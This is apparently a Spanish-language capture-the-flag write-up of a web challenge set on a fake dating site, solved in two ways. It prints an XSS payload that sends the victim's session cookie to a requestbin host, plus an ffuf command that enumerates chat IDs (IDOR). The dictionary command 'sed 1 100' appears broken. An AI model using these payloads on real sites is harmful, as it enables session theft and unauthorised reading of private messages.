---
title: "OnlyHacks"
date: "2025-02-20T17:00:00-05:00"
draft: false
tags: ["Web", "Insecure Direct Object Reference (IDOR)", "XSS"]
---

Al ingresar a la url tenemos la opcion de registrarnos y logearnos que es lo primero que vamos a hacer.

![image.png](https://img.notionusercontent.com/s3/prod-files-secure%2F750682be-fdb9-46ae-a38e-e8876d94867f%2F3144ecf3-add8-4e71-9900-be7912a3a2f4%2Fimage.png/size/w=2000?exp=1740447724&sig=KI5EwiNKmtttFrPR69mBJ7KhkuqJ6BRISrs0b0i7Scg)

Dentro podremos ver una web de citas en la que la unica persona interesante es Renata ya que nos dice que siempre esta conectada, por lo que le vamos a dar match y vamos a hablar con ella.

![image.png](https://img.notionusercontent.com/s3/prod-files-secure%2F750682be-fdb9-46ae-a38e-e8876d94867f%2Fc3f7b3a1-1c4d-4a3e-895a-c5a764d36efc%2Fimage.png/size/w=2000?exp=1740447765&sig=SddPY00ObMxaQTrJMJEA6je744R4hJM2RIsKluMpJTQ)

En este punto hay dos formas de resolver la maquina una es haciendo un Cross-Site-Scripting yla otra es modifcando la url ya que podemos ver que cada chat tiene un id.

Vamos a mostrar la primera si tratamos de usar un titulo html en la conversacion con renata este respondera al contenido:

```markdown
<h1>Hi</h1>
```

![image.png](https://img.notionusercontent.com/s3/prod-files-secure%2F750682be-fdb9-46ae-a38e-e8876d94867f%2F81f91593-3c96-4adc-8f47-3615a95f20a8%2Fimage.png/size/w=2000?exp=1740447807&sig=gye-uNpgTs_ef57Hh5LZoUtbqkvfPfQTQRp9B2b8EJk)

Vamos a tratar de consegir la cookie de su sesion con el siguiente comando:

```markdown
<script>document.location='http://requestbin.whapi.cloud/19bdo3d1?
c='+document.cookie</script>
```

Vamos a ir a esta pagina [http://requestbin.whapi.cloud/](http://requestbin.whapi.cloud/) crearemos una nueva request y remplazaremos la url en el comando, si hace click en el link y recargamos la pagina de la request tendremos lo siguiente:

![image.png](https://img.notionusercontent.com/s3/prod-files-secure%2F750682be-fdb9-46ae-a38e-e8876d94867f%2F635e7f5e-1d40-4f4e-8b49-10e7a84ac571%2Fimage.png/size/w=2000?exp=1740447830&sig=ExttcFB4zPtVpP82FAd74YZa3Bw_9amIb5cFfAOHSb0)

Remplazaremos esa cookie en el navegador usando inspeccionar y podremos ver los chats de renata junto con la flag.

![image.png](https://img.notionusercontent.com/s3/prod-files-secure%2F750682be-fdb9-46ae-a38e-e8876d94867f%2F342c6276-8af5-4ee2-9c8e-4c2132f4d040%2Fimage.png/size/w=2000?exp=1740447848&sig=nf8dK4DiikTyuHbVtAsN3i3TSF0DJE1ISomBhtOA_G8)

Ahora vamos con la segunda forma

Cuando entramos al chat de renata podemos ver como la url es:

```markdown
http://94.237.55.96:37246/chat/?rid=6
```

Si cambiamos el valor del seis podremos ver otros chats hay una forma de probar esto de manera automatica con ffuf para verificar que sea un IDOR

```bash
#Creamos el diccionario
sed 1 100 > id.txt

ffuf -w id.txt -u 'http://94.237.55.96:37246/chat/?rid=FUZZ' -H "Cookie: session=TUCOOKIE" -mc 200
```

Esto nos devolvio dos posibles chats pero uno es el nuestro por lo que si probamos con el otro tendremos la flag.

![image.png](https://img.notionusercontent.com/s3/prod-files-secure%2F750682be-fdb9-46ae-a38e-e8876d94867f%2Fb1d587ff-8dd0-4b58-aec1-4642bd6add37%2Fimage.png/size/w=2000?exp=1740447873&sig=53yGOMJd8OPFPOzQBd3aohhFhhVM6Uq6VUJ2OpnsOqo)
